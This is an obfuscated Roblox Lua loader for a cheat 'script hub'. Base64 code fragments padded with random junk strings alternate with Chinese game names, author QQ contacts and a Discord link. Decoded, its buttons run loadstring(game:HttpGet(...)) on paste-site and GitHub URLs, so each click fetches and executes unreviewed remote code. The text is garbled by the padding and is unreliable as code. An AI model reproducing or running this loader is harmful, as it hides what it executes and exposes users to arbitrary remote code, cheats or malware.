('LjlfHtyBgHDEXvoQBRyuMQwGOQgZqDtFlrskJRoigLKazWevBnuXFRQvhEYghFeUawDSJNLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')需要密钥自己加dctZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hDEGkyXUkLdYsEpgAiOEfOjblZNsMVMDMCSaeQXKVoOkRGAzNfhIRFjBTgFeipwgaPZqWmLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/DrakainnnDL/Script/main/TheStrongestBattletZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OKGbHdvQeiEzvavGKDvsLMHMJKTBafFXiMXYVNvgkVHcfokTLntiMmLjPmyFCpEBgBpIlLKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')点击我复制dctZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AWTjijRjivXcFYAvbcWZVWLcHsqiyQKNEcbJIBJIaHkGQTEArvDyiPkWHWmPZMyUHoNZrALGZ1bmN0aW9uKCkNCiAgICBzZXRjbGlwYm9hcmQo')https://discord.gg/Mbh9NRd8tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DEBaqAvWlJGdpwfytztZQsQuPheEBUHDSZqlPTScwlnaKUqNcZPvGiJrsttrPCFHZuHUxnKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XizbNueeXEmTPhbcIWvsSaiIhzDmkdvquFOjWnlthGqXQLyCFoEMePyhAKZqlgVGAHygAzLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('aivKwJrnjtLRfZPsdDjohndkPYZBdCIxsCorPeGImlCIoqWBVHYHYczFMaCjTNZmCNsXQCamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qOrvTHBWQmVLLfDAkmntmPJvhigUxRvHvBZzBzGGnTVXfymizFDgHYVwQyiRAKmPfGTdKyamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fEuysgjOKZWuGUybcqgsAdIvcPmaIgGmEiKaCzPsWdrHTflhsokQTiSMmEAFfodSoSOpkobG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KtrxeRxIHGCaxngHxoUgmzeMYQOJtzrZOCCPeFSXKxEmZRsiaHKNxilPLVuEmpkDyWKxpeKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')奎尔湖tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('iFgIrsoJnbbIhDINzTLtHGgtmqrBeQOGNPxsKLkqvLXwgFTKQbdnLQgylgdgBQvatFtzzYLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PDGzYbmxTGnVBYRyEAnjNIVtKVlXDvmkEsRzpFqpGmyZRFEMOUFcwlQCZkvgILDkDGBqpeKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OntxduKRULbidsNzWOJvqIyMJWVfzAUuGfIEElHocDRHwPSmeTUaxqfmfVzEUFFEnzYYFBLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')奎尔湖tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AXRKhDBOJwPyAhyQYBqgZBjKQvaZMeILOqHNmLSqjAigJURhmaYHqYaMQHExOdTFLlgcAGLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/ZwaXa3ZR/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VmKvhMwtcixYZpWmTqKbCmPLtiUkowoqcvuJjsuWILeluPlcTiBcoQWfBGNWAISRhxQPsxKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wTlByUxUxjJlDLZcwardwgTFYRamcRyZlYNDnzAewlTQWapEITfCfAxCwvZnBcfamyjsgpLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('pKSzUbRTbMHfURBvhmHjMUrnBzqEyfHFOHBvlAchpfawmVOicBdFovVxWvxbCUjsesjjVfamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('OUoNrJJmXwibuiVahmaSqxoWeinQMnYqjwZVcJecNwMyNwzbypnawolwCKGueHJGSFzIdTamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FnaBmiTpMSZjFxnbBAnHrcLTpMiroIcqoFHAMmqBZWeNarYIZXqUcIJQbpeOrHNaYtYLBebG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xFVyflLklOomlMMeacfZxaNJfSIloHtOhwPIswduGaNZVCDbfVrpLXGCyFXwGJVLawBIPAKSkpKCkNCmVuZCkNCiAgICBjcmVkaXRzOkJ1dHRvbig=')刺客脚本只适配忍者和FL注入器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('axTzRrLgmLWBzPaOTFrhUbRfzURZmlbXRlOQWBcaesCuwvAziisiEGXMtTNzxImTGEYTmNLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~CikeScriptfreetZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VwcbajYwzUeFnudaVyVuNaKUwyuMDSripSIWjzVlsBFfXBKWNcXjXCLdroXKQnLNJkTvwgKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')格林维尔tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('psRkTfZXkqJcMQqpAmdpQrnRtcuZdKiLORkVonyRJouXZaasHChtzTnBhFppvTMnzOAUCzLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LByBDrJBYAToAAPJjJKZcdFlgFrhHTjwzejaUfmgKoQdreBNlgLcPwxIIWMrWYsFIiYIZsKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uSRymlPhPejpzEpocVqWsXcuhSxWEjNFmOraRUrCzKdJgeqEQEjOztJqepSDUSLcyxNkYVLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')格林维尔tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bdzuBdvvrfhgAQSGWlujYLsWNiOnfOKYICpFXesEkjRGulHAypGmJPnQzaJWiiklpOFaFwLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/WBYAsWJm/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wgadkvVSZYsVMcIPtZNJeIgmyuRLCtMGPMfVbcEWOuMChucNmUgGiYiQFhxQuIsrrfTpgHKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kgdaaFTbLAMiBYhiPglYszyKmHgvmydgTkwUndRRaolyuAJUGdiigfMOrfgTRddxCItxWULGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('IWtLfsnwUFjskexlIGPmPPsKKVwfJthcUfSCbTwCqWcWOAFcdOYrZdedXVXsaWMOvFEVitamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DiWYsFRLnbFPdGHVLwLhKBhQEQTTRKXGzvQKiDJDgKublynEwBonINuJhDTKxIYRCEEQpqamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ursDABdHFeziVWmCkvjgLIKczaGrVqhIUwbLoyuiSYBdVSciHSIYaqKiQEzZsbSjWAOZrybG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('hWYhHXFcjoEgnybSCgbXArBEnyUvYiUXYtSSXWRbNdfHFXMStITsomgkCVYjDkRUZUPvZoKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')恐怖奶奶tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RuajfeJBbDFfEzTZJIfCxYkIPNsbQDZkAoklujtAIWIyPTcVlyiKfbrZexGFyaVcPfTycULA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('piEoihxDiEPvxadOTZhpcoaCNXsIvwICjhTSgpWrOGcRdneszjEOLQQNApgQlyhPwENsulKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CjilflLqtakVpilTZlceJKNLbYtzoWmJoGYYhnYeHQMjxgnJZrMLUjkVywbXPsrPkSmrqZLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')恐怖奶奶tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jYDpNAIIQSXXiezSIFreqprgFbEeURRqvkVWhEqMqucgOIHQTZgtwiXKVNaKmdYyqKmEyMLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/o688Jvmn/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ywGTDYLmYFZYwBNUlyEedmxoNuHAMDaiYfDyXtuoLEDYGUaRpjQpHvgqFbjSVecWyakvugKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('TGPnrMeMAlmYJgUadPqxAwZZzcAFMPbMXnMbrpXwHjVUuddWczVRcxKoVHqaqLwjHDwgUzLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jXybSTefgdEfyzvKvHAHFHxfqhYxrybPJXUDZdEtaXDqPRSplCtKLGDHcfWOhMqYqCXaiGamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WwaIsZnaGqeWPHzJTmihIjhgjQHCeJxoAomMXfScfREMYgFncNEbaPHDnLOQEiEHkoFeqpamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dEMqHTtjouFZmAzGgAllvrFKRkMDATEjswvrLTlgitsaJfuzKMdMmuilLsuyicipZihvcIbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VeMpFbtxmEoYdAovfqMOlWybebKNDTctLBHJdEKdHnYhvxSNtCPLHghIbMwNtbFnPiEyRTKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')奶酪逃亡tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UMOarmnCLMAcpgVhvSuVNMSYcSjbQnGkNSZbBdCsslbGRIVSDGwUPSsDKZfRmLdEEQPpCRLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CyIqwCTxWRWWweBOSMnYPprJdgyWVTxpjcYhvHDdLuzgOtaUVJYXkgCkDCMssgnpttLaAEKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KrvMfjZHExhonZZZrXxubNAuuFzAfFtHTjpCdGJaZKMYiCrMiQyqtvQBBZlikowKOVCBsXLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')奶酪逃亡tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dYbDoTpiZdfsRnzRBfGorxjsGTAivpWyWzwGqINXGZEBSBmjjchHpJXwEwqlfZeieNBjoYLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/IIpzN8f5/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tSbMFfiXHSfVJNcBLIosYJCJdcFlqBdOJUJciALcVOffJVGJPFHddlyCmbotbyMemDgPxtKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')我的餐厅tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vYjvJwaBednaGszCKLpeWhOgsFRYLTgmAolYAlzMiiTLQOqmALUmiqsPYJEPxuREjAIdhCLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mSkDxQCHIszKXXzoSAaGTXIlhtxxjtReAnDKJJPFoujMwaNaUyvpyppNynYySulJEukxDzKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UvyRkXKuiTOndAwVEWvmExgElEXMkVtZdXqrtqRgwVfGRKLfWvYBMstPWbYPdswbTIXIcJLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')我的餐厅（不确定是手机端）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BcyVDngVmFURRNclxVuYIChPAERbTPcPuryDIiQhOiFfMIKRQddrtlqyilMDBapAHuStxVLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')http://void-scripts.com/Scripts/myRest.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KXrVqiHahzSulzEnkVwOoVgbyOHAiacvewgPUmAAiqnAgqwRqzEcUFVKlTDboKxGuGnvPHKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')我的餐厅tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NQXNZLcZfFInkMUxgsroVqFqpXYrtUNqLHLEgRDQYitnvvZjnRwqFEncNcKJfezvKRxwFcLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/5R1Ch6kk/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fvwLpUayEqKZPPxgAmRAjFtNZGyveSYuXNsgglUKmZEAnyAKazdkXrdynDjltMISPjUimDKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('bsAwHyxpRdsZdwOuhOgSiQnXeMORYDRTxprwKQcCjoTPgaCOCvIdFmFddvqZKcHWzGqxaELGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JUFkvZpCsebUgtUZGrEgozSedsYWHFDhVPhrryTrlqQzJNNVkbktBOEYcARAZwJVhWFNNNamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fbKQTHDMjiqZIesYvonaHoxArmomdcSExvIluOmgbYkHqoFuVrRoSPQuthMyFKjRHDkjOwamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nchFJAvaQinBmUwAUDDjORzRkMJaDwfUDvhtWrkvzxZvjWVYcoqFoNFHhwZUagAVGWLxolbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('klfqvzoPLUUdrxmWCbdDztttJPlEoegFCVAmLkCIdySjDInJSlvaDOndfFrNNICjuoLSOzKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')钓鱼模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('DGsBorfOliEtrViaFtzsgKjOYqIHXAMmvXRYlhBezrbvwVvCErkXYSFzvKpsemobacLttALA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ctWyDPChfAwCJzgACdVliJpznqGmwwonkyCsjdEpzMRQqIgQtbDCTHSMasKHJASTcFpeGXKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HULsdxbXoazsgWjBBCMknsvIXSDyAHZGdSXpxmXHeZMrgNddMFJrpuCklNwPgVRcjlRWcPLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')钓鱼模拟器（1英文）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SczkxfQULeyubJFRguNOmekPDXyzDWmbvVPqBpMCEYrHlDThTqbMJfNTnuacnYyrQKKSWGLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~LNINIGGDHHtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('exDfdBFGAFFCfCASIZQbxFsnzOswpmyaRiaFrAwSZXsKkqAASOtRHxTvmpIJILAkbEGQGvKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')钓鱼模拟器（2英文）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CLrCLmoYAoTaPwEpSBdHaLoZBWvKUIpiZjJbWJOEQYrMpMnLdbRjFqZCHpCvDdEQsMzcdXLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/reddythedev/Reddy-Hub/main/_LoadertZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YkdiKztWGzWVcLScVKBrGdkTdLyLkgAgYWLgAiHDDPIBrvHiATbrpaMRZmjSMMTsQazaDFKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')钓鱼模拟器（3英文）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kvQGJTchFpDugsrSfbqozqRhkakEvElKudKJbOrhZbgmhbDmoIvQRYxmHfvOtOxVGTYSsVLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/bebedi15/SRM-Scripts/main/Bebedi9960/SRMHubtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('VQmHbCJcFTGPMuOFnWgOmzkoncDVfmdoRfNpbAQtjNfJvUCHVEJvQUEsbakEuEHTpGRWCCKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('sgICacOEsBEamvdNbTgWhIjPcrKflNHCoMmNZkioBtRrDrLuIXEapepuWICuovsUQmOOqnLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FWSyacLXCQRiZSziWisQRinTulmrVGSiRrBNaObzYcmqFshXbdxvhlmkfonuKDpkJaLsoAamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YrGDzbxMvRpiIzRWuBEwAWQYsNBIVPgHxnfoMXSmnhwZxUOKHyXQzqmaUlZAixjiidUmooamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('GxAVoOLtDQurBQIanHQMyWhNxURRmreVUFUsrvjoYimIYgnSUWIdzbWYepXHanbMIDIrchbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xLONhePcbCLoMucylKGimFQDJRnPEvqYRVwKhxZbbaeAldyDNJJXohyHQERZQJuJKmmUBaKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')旗帜战争tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MLFrCMGKvQXIFYOXpIoseunYHwEVhNsdTNtjbkhHfxAgPCtGzrzddhOHbrqBLhyiBBOyVhLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ijYsHxBzwrDFaFwxduFIhBOxEJwcMqOmctRfoVvdRowckaKgrqCsPQKLkyqIlIPtIwFRDnKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ohMxvbESpARmltYVPSGEtrightutRFmlnSmodVNwTMmSdrqBkaGNiejbijcwwLiRUmWWejLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')旗帜战争（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uGeaiknQgVIpLLYVholWMfYeQhujaymmfpITWTaBmYvfLVoATeqAFkbkRiVCeiJZXnDYKNLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Flag%20Wars.txttZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('musxWUbEFBXxjbEUvGUbhEVCOvZvZMhTLqQxIBFfWwPyUoXRDqPCOnTTggLgxGyeyHVVdkKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uK